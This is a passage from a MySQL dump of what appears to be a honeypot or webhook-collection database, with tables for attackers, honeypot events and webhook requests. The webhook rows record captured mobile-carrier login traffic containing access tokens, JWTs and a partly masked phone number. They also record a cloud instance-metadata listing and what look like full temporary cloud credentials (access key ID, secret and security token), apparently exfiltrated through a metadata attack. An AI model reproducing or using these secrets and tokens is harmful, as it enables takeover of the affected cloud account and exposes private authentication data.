rNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw&bizType=1&version=2.1.10&cmApiCode=5&cuApiCode=10&ctApiCode=8\",\"method\":\"POST\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"OK\\\",\\\"requestId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"success\\\":true,\\\"module\\\":[{\\\"reqTimeStamp\\\":\\\"20260410015652407\\\",\\\"appId\\\":\\\"300013207076\\\",\\\"sign\\\":\\\"022b63b0d6f497093ed8d40229606cd8\\\",\\\"msgId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"vender\\\":\\\"CM\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"},{\\\"reqTimeStamp\\\":\\\"1775757412409\\\",\\\"appId\\\":\\\"1NjHKGFMr0a\\\",\\\"sign\\\":\\\"5d3cbccae9b550e2a6849726ffe8f6aa\\\",\\\"vender\\\":\\\"CU\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"},{\\\"paramKey\\\":\\\"21A20396C7DEDC27075620A744E937B17D5BCBCD5910ACBF62EDCFF7D7601943E593D3802CD0AE013DB22DD5B9CEAE9CA34D4B8162D19B7BE0C8040232146899F53362C4054C6884860190E1BFA07C3AA826ACE8E0B7CD4645407AA3D6689ED05D6AB9339AE40B0A1054E669B91F3B4F00D6AC60EB2170455167939A832F3782\\\",\\\"paramStr\\\":\\\"16949B885705AE6D3F85E5325F45881D33590D43FB00723872D6D289DEFBCBC5A93EFDECAEDE51D84D294D82F5A22B69FD8D5E2BD19C9E5A0C0F13077C67D805\\\",\\\"appId\\\":\\\"9345448666\\\",\\\"sign\\\":\\\"9ECB6E62C64492D03D07707CD04D948C15C420B2\\\",\\\"vender\\\":\\\"CT\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"}],\\\"message\\\":\\\"OK\\\",\\\"class\\\":\\\"com.alicom.access.client.core.common.dto.AccessResponse\\\",\\\"httpStatusCode\\\":200}\",\"time\":310},{\"type\":\"XMLHttpRequest\",\"url\":\"//dypns.alysm.cn/pns/getSign?accessToken=Zyt8U732FWsur2G%2FUnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae%2FR2cXNfFCT4Be4j3xSQEfLa4%3D&jwtToken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrqrNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw&apiCode=8&operatorId=3&content=jqfjs_callback9345448666100101957963573redirectm5YPlC3ioYLQGR6W5FvNz8twhPuGpRIj17757574125051.5\",\"method\":\"POST\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"OK\\\",\\\"requestId\\\":\\\"5FC59F9F-A215-4D0A-A9AF-4144FC42BADF\\\",\\\"success\\\":true,\\\"module\\\":{\\\"sign\\\":\\\"267AFE489C19036FD8CD585D362BBB7A40DEC10A\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.GetSignDTO\\\"},\\\"message\\\":\\\"OK\\\",\\\"class\\\":\\\"com.alicom.access.client.core.common.dto.AccessResponse\\\",\\\"httpStatusCode\\\":200}\",\"time\":109},{\"type\":\"XMLHttpRequest\",\"url\":\"https://verify.cmpassport.com/h5/httpsPreGetmobile\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"header\\\":{\\\"appId\\\":\\\"300013207076\\\",\\\"msgId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"timestamp\\\":\\\"20260410015652829\\\"},\\\"body\\\":{\\\"msisdnOwner\\\":\\\"CU\\\",\\\"msisdnOwnerback\\\":\\\"0\\\",\\\"ctGetMobileSwitch\\\":\\\"0\\\",\\\"resultCode\\\":\\\"103111\\\",\\\"keytype\\\":\\\"1\\\",\\\"cuGetMobileSwitch\\\":\\\"0\\\",\\\"resultDesc\\\":\\\"WAP网关IP错误\\\",\\\"ipType\\\":\\\"ipv6\\\"}}\",\"time\":364},{\"type\":\"XMLHttpRequest\",\"url\":\"https://hs.wosms.cn/api/atrace/isp?appKey=1NjHKGFMr0a&authenticator=5d3cbccae9b550e2a6849726ffe8f6aa&ts=1775757412409&bwid=c117e16133d15f2b45dc13140cf2ba04b76f7aac&signType=A\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"0000\\\",\\\"msg\\\":\\\"成功\\\",\\\"traceId\\\":\\\"62f1227886aea1af\\\",\\\"url\\\":\\\"https://nisportal.10010.com:9001/api?appid=2366526989056&ret_url=aHR0cHM6Ly9ocy53b3Ntcy5jbi9hcGkvbWF1dGgvY3UvMjA0MjMwMDczMDQ1OTA5MDk5Nw==\\\",\\\"operator\\\":\\\"CU\\\",\\\"traceCallback\\\":\\\"\\\"}\",\"time\":432},{\"type\":\"XMLHttpRequest\",\"url\":\"https://log-h5.cmpassport.com:9443/log/logReport\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"resultCode\\\":\\\"103414\\\",\\\"config\\\":{\\\"sizelimit\\\":\\\"2\\\",\\\"limitM\\\":\\\"20\\\",\\\"norlog\\\":\\\"1\\\",\\\"limitN\\\":\\\"3\\\",\\\"crashlog\\\":\\\"1\\\",\\\"limitX\\\":\\\"20\\\",\\\"fusingTime\\\":\\\"1\\\",\\\"failLimit\\\":\\\"3\\\",\\\"timelimit\\\":\\\"2\\\"},\\\"desc\\\":\\\"parameter validate failed\\\"}\",\"time\":690},{\"type\":\"XMLHttpRequest\",\"url\":\"https://log-h5.cmpassport.com:9443/log/logReport\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"resultCode\\\":\\\"103000\\\",\\\"config\\\":{\\\"sizelimit\\\":\\\"2\\\",\\\"limitM\\\":\\\"20\\\",\\\"norlog\\\":\\\"1\\\",\\\"limitN\\\":\\\"3\\\",\\\"crashlog\\\":\\\"1\\\",\\\"limitX\\\":\\\"20\\\",\\\"fusingTime\\\":\\\"1\\\",\\\"failLimit\\\":\\\"3\\\",\\\"timelimit\\\":\\\"2\\\"},\\\"desc\\\":\\\"success\\\"}\",\"time\":544},{\"type\":\"XMLHttpRequest\",\"url\":\"https://hs.wosms.cn/api/mauth/cu/2042300730459090997?code=88FCiJ4YS1dU991835113300ffAY4Y43&province=1&err_code=\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"0000\\\",\\\"msg\\\":\\\"成功\\\",\\\"traceId\\\":\\\"2042300730459090997\\\",\\\"accessCode\\\":\\\"2042300734313656335\\\",\\\"pmobile\\\":\\\"166****8214\\\",\\\"operator\\\":\\\"CU\\\"}\",\"time\":146}]', '220.200.111.10', 'POST', '{\"Accept\":\"*/*\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,zh-Hans;q=0.9\",\"Connection\":\"keep-alive\",\"Content-Length\":\"6496\",\"Content-Type\":\"application/json\",\"Origin\":\"http://8.166.143.185\",\"Referer\":\"http://8.166.143.185/\",\"User-Agent\":\"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1\"}', '2026-04-09 17:56:55'),
(40, '[{\"type\":\"XMLHttpRequest\",\"url\":\"./js/1.txt\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"Message\\\":\\\"OK\\\",\\\"RequestId\\\":\\\"238695EA-A4E8-5092-80F3-F475C4022624\\\",\\\"TokenInfo\\\":{\\\"JwtToken\\\":\\\"eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrqrNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw\\\",\\\"AccessToken\\\":\\\"Zyt8U732FWsur2G/UnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae/R2cXNfFCT4Be4j3xSQEfLa4=\\\"},\\\"Code\\\":\\\"OK\\\"}\",\"time\":68},{\"type\":\"XMLHttpRequest\",\"url\":\"//dypns.alysm.cn/pns/authPnsWebAllVendor?accessToken=Zyt8U732FWsur2G%2FUnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae%2FR2cXNfFCT4Be4j3xSQEfLa4%3D&jwtToken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrqrNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw&bizType=1&version=2.1.10&cmApiCode=5&cuApiCode=10&ctApiCode=8\",\"method\":\"POST\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"OK\\\",\\\"requestId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"success\\\":true,\\\"module\\\":[{\\\"reqTimeStamp\\\":\\\"20260410015652407\\\",\\\"appId\\\":\\\"300013207076\\\",\\\"sign\\\":\\\"022b63b0d6f497093ed8d40229606cd8\\\",\\\"msgId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"vender\\\":\\\"CM\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"},{\\\"reqTimeStamp\\\":\\\"1775757412409\\\",\\\"appId\\\":\\\"1NjHKGFMr0a\\\",\\\"sign\\\":\\\"5d3cbccae9b550e2a6849726ffe8f6aa\\\",\\\"vender\\\":\\\"CU\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"},{\\\"paramKey\\\":\\\"21A20396C7DEDC27075620A744E937B17D5BCBCD5910ACBF62EDCFF7D7601943E593D3802CD0AE013DB22DD5B9CEAE9CA34D4B8162D19B7BE0C8040232146899F53362C4054C6884860190E1BFA07C3AA826ACE8E0B7CD4645407AA3D6689ED05D6AB9339AE40B0A1054E669B91F3B4F00D6AC60EB2170455167939A832F3782\\\",\\\"paramStr\\\":\\\"16949B885705AE6D3F85E5325F45881D33590D43FB00723872D6D289DEFBCBC5A93EFDECAEDE51D84D294D82F5A22B69FD8D5E2BD19C9E5A0C0F13077C67D805\\\",\\\"appId\\\":\\\"9345448666\\\",\\\"sign\\\":\\\"9ECB6E62C64492D03D07707CD04D948C15C420B2\\\",\\\"vender\\\":\\\"CT\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.PnsWebAuthDTO\\\"}],\\\"message\\\":\\\"OK\\\",\\\"class\\\":\\\"com.alicom.access.client.core.common.dto.AccessResponse\\\",\\\"httpStatusCode\\\":200}\",\"time\":310},{\"type\":\"XMLHttpRequest\",\"url\":\"//dypns.alysm.cn/pns/getSign?accessToken=Zyt8U732FWsur2G%2FUnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae%2FR2cXNfFCT4Be4j3xSQEfLa4%3D&jwtToken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrqrNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw&apiCode=8&operatorId=3&content=jqfjs_callback9345448666100101957963573redirectm5YPlC3ioYLQGR6W5FvNz8twhPuGpRIj17757574125051.5\",\"method\":\"POST\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"OK\\\",\\\"requestId\\\":\\\"5FC59F9F-A215-4D0A-A9AF-4144FC42BADF\\\",\\\"success\\\":true,\\\"module\\\":{\\\"sign\\\":\\\"267AFE489C19036FD8CD585D362BBB7A40DEC10A\\\",\\\"class\\\":\\\"com.alicom.access.client.core.pns.dto.resp.GetSignDTO\\\"},\\\"message\\\":\\\"OK\\\",\\\"class\\\":\\\"com.alicom.access.client.core.common.dto.AccessResponse\\\",\\\"httpStatusCode\\\":200}\",\"time\":109},{\"type\":\"XMLHttpRequest\",\"url\":\"https://verify.cmpassport.com/h5/httpsPreGetmobile\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"header\\\":{\\\"appId\\\":\\\"300013207076\\\",\\\"msgId\\\":\\\"D4C57297-86BB-4616-BD6C-FED206A52AD1\\\",\\\"timestamp\\\":\\\"20260410015652829\\\"},\\\"body\\\":{\\\"msisdnOwner\\\":\\\"CU\\\",\\\"msisdnOwnerback\\\":\\\"0\\\",\\\"ctGetMobileSwitch\\\":\\\"0\\\",\\\"resultCode\\\":\\\"103111\\\",\\\"keytype\\\":\\\"1\\\",\\\"cuGetMobileSwitch\\\":\\\"0\\\",\\\"resultDesc\\\":\\\"WAP网关IP错误\\\",\\\"ipType\\\":\\\"ipv6\\\"}}\",\"time\":364},{\"type\":\"XMLHttpRequest\",\"url\":\"https://hs.wosms.cn/api/atrace/isp?appKey=1NjHKGFMr0a&authenticator=5d3cbccae9b550e2a6849726ffe8f6aa&ts=1775757412409&bwid=c117e16133d15f2b45dc13140cf2ba04b76f7aac&signType=A\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"0000\\\",\\\"msg\\\":\\\"成功\\\",\\\"traceId\\\":\\\"62f1227886aea1af\\\",\\\"url\\\":\\\"https://nisportal.10010.com:9001/api?appid=2366526989056&ret_url=aHR0cHM6Ly9ocy53b3Ntcy5jbi9hcGkvbWF1dGgvY3UvMjA0MjMwMDczMDQ1OTA5MDk5Nw==\\\",\\\"operator\\\":\\\"CU\\\",\\\"traceCallback\\\":\\\"\\\"}\",\"time\":432},{\"type\":\"XMLHttpRequest\",\"url\":\"https://log-h5.cmpassport.com:9443/log/logReport\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"resultCode\\\":\\\"103414\\\",\\\"config\\\":{\\\"sizelimit\\\":\\\"2\\\",\\\"limitM\\\":\\\"20\\\",\\\"norlog\\\":\\\"1\\\",\\\"limitN\\\":\\\"3\\\",\\\"crashlog\\\":\\\"1\\\",\\\"limitX\\\":\\\"20\\\",\\\"fusingTime\\\":\\\"1\\\",\\\"failLimit\\\":\\\"3\\\",\\\"timelimit\\\":\\\"2\\\"},\\\"desc\\\":\\\"parameter validate failed\\\"}\",\"time\":690},{\"type\":\"XMLHttpRequest\",\"url\":\"https://log-h5.cmpassport.com:9443/log/logReport\",\"method\":\"post\",\"status\":200,\"response\":\"{\\\"resultCode\\\":\\\"103000\\\",\\\"config\\\":{\\\"sizelimit\\\":\\\"2\\\",\\\"limitM\\\":\\\"20\\\",\\\"norlog\\\":\\\"1\\\",\\\"limitN\\\":\\\"3\\\",\\\"crashlog\\\":\\\"1\\\",\\\"limitX\\\":\\\"20\\\",\\\"fusingTime\\\":\\\"1\\\",\\\"failLimit\\\":\\\"3\\\",\\\"timelimit\\\":\\\"2\\\"},\\\"desc\\\":\\\"success\\\"}\",\"time\":544},{\"type\":\"XMLHttpRequest\",\"url\":\"https://hs.wosms.cn/api/mauth/cu/2042300730459090997?code=88FCiJ4YS1dU991835113300ffAY4Y43&province=1&err_code=\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"code\\\":\\\"0000\\\",\\\"msg\\\":\\\"成功\\\",\\\"traceId\\\":\\\"2042300730459090997\\\",\\\"accessCode\\\":\\\"2042300734313656335\\\",\\\"pmobile\\\":\\\"166****8214\\\",\\\"operator\\\":\\\"CU\\\"}\",\"time\":146}]', '220.200.111.10', 'POST', '{\"Accept\":\"*/*\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,zh-Hans;q=0.9\",\"Connection\":\"keep-alive\",\"Content-Length\":\"6496\",\"Content-Type\":\"application/json\",\"Origin\":\"http://8.166.143.185\",\"Referer\":\"http://8.166.143.185/\",\"User-Agent\":\"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1\"}', '2026-04-09 17:56:55'),
(41, '{\"data\":\"disks/\\ndns-conf/\\neipv4\\nhibernation/\\nhostname\\nimage-id\\ninstance-id\\ninstance/\\nkms-server\\nmac\\nnetwork-type\\nnetwork/\\nntp-conf/\\nowner-account-id\\nprivate-ipv4\\nregion-id\\nserial-number\\nsub-private-ipv4-list\\nvpc-cidr-block\\nvpc-id\\nvswitch-cidr-block\\nvswitch-id\\nwsus-server/\\nzone-id\"}', '8.166.143.185', 'POST', '{\"Accept\":\"*/*\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,zh;q=0.9\",\"Connection\":\"keep-alive\",\"Content-Length\":\"305\",\"Content-Type\":\"application/json\",\"Referer\":\"http://8.166.143.185/\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"}', '2026-04-10 18:00:01'),
(42, '{\"data\":\" {\\n  \\\"AccessKeyId\\\" : \\\"STS.NZSzBSzh6ZUqpECs5NRzqyWdp\\\",\\n  \\\"AccessKeySecret\\\" : \\\"DyAtwhFKwgoP7xjZ4GS7TuSkxA8twtwwdWTW7DpCxhuF\\\",\\n  \\\"Expiration\\\" : \\\"2026-04-11T00:15:30Z\\\",\\n  \\\"SecurityToken\\\" : \\\"CAIS6AJ1q6Ft5B2yfSjIr5nmMfjnl7cX7ZeacmPylzUbXvVdlpLPkjz2IHhMf3htBO8asvQwmGBV7foSloltTtpfTEmBc5I179EI4R3+apWeqdy647oP1o+3SHeZVEYcIjR13L6rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH+NJc3ZcchC4jrgLwoL/v7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3d14kO/dmR/4b8KihzqEooJ/TioP8zAxVeP1YST7WSoe6xY7LH+q1c8w+cbvribwYH2A6g/Mf2iBTghJzXGsiE7JJoe+mhK7VyZ/wfg62KtEHgxYidtkUHZtMpb5f5XumgzSkCVZxLVuX/2iWdGFCoSFMFVoiuUaFFAtugbta3gwPb94agAG1LRhbaLiSG8rFjDIASe3ih/xGIKPYXH1iuZioeOh3jq+G79buCstqRl5aDpTNzgpiBLuyeDNrD4669LSKRMeCkAiaERwZy+1HBAjCmWupjAFLOSFaBphHE+x/vGdz4CktpSVzvZALVwas8MNKWLM+L/CSpSSVF2MThMa0OdHj8iAA\\\",\\n  \\\"LastUpdated\\\" : \\\"2026-04-10T18:09:23Z\\\",\\n  \\\"Code\\\" : \\\"Success\\\"\\n}\"}', '8.166.143.185', 'POST', '{\"Accept\":\"*/*\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,zh;q=0.9\",\"Connection\":\"keep-alive\",\"Content-Length\":\"959\",\"Content-Type\":\"application/json\",\"Referer\":\"http://8.166.143.185/\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"}', '2026-04-10 18:12:14');

--
-- 转储表的索引
--

--
-- 表的索引 `attackers`
--
ALTER TABLE `attackers`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `honeypot_events`
--
ALTER TABLE `honeypot_events`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `honeypot_logs`
--
ALTER TABLE `honeypot_logs`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `plugins`
--
ALTER TABLE `plugins`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `webhook_requests`
--
ALTER TABLE `webhook_requests`
  ADD PRIMARY KEY (`id`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `attackers`
--
ALTER TABLE `attackers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=112;

--
-- 使用表AUTO_INCREMENT `honeypot_events`
--
ALTER TABLE `honeypot_events`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用表AUTO_INCREMENT `honeypot_logs`
--
ALTER TABLE `honeypot_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用表AUTO_INCREMENT `webhook_requests`
--
ALTER TABLE `webhook_requests`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
